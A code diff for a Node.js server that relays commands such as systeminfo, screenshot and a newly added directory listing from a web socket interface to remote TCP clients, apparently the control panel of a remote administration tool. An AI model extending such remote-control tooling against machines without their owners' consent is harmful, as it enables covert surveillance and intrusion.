@@ -17,19 +17,23 @@ io.on('connection', function(socket){
     switch (obj.cmd) {
       case 'off':
         console.log('send close', obj);
-        clients[obj.sid].socket.write('close\0');
+        clients[obj.sid].socket.write('close:0\0');
         break;
       case 'hi':
         console.log('send hi', obj);
-        clients[obj.sid].socket.write('hi\0');
+        clients[obj.sid].socket.write('hi:0\0');
         break;
       case 'systeminfo':
         console.log('send systeminfo', obj);
-        clients[obj.sid].socket.write('systeminfo\0');
+        clients[obj.sid].socket.write('systeminfo:0\0');
         break;
       case 'screenshot':
         console.log('send screenshot', obj);
-        clients[obj.sid].socket.write('screenshot\0');
+        clients[obj.sid].socket.write('screenshot:0\0');
+        break;
+      case 'ls':
+        console.log('send ls', obj);
+        clients[obj.sid].socket.write('ls:' + obj.args + '\0');
         break;
     }
   });
@@ -86,7 +90,7 @@ var server = net.createServer(function(socket) {
 function digest() {
   setTimeout(function() {
     for (var c in clients) {
-      var sindex = clients[c].buffer.indexOf('/0');
+      var sindex = clients[c].buffer.indexOf('||');
       if (sindex != -1) {
         got(c, clients[c].buffer.slice(0, sindex));
         clients[c].buffer = clients[c].buffer.slice(sindex + 2);
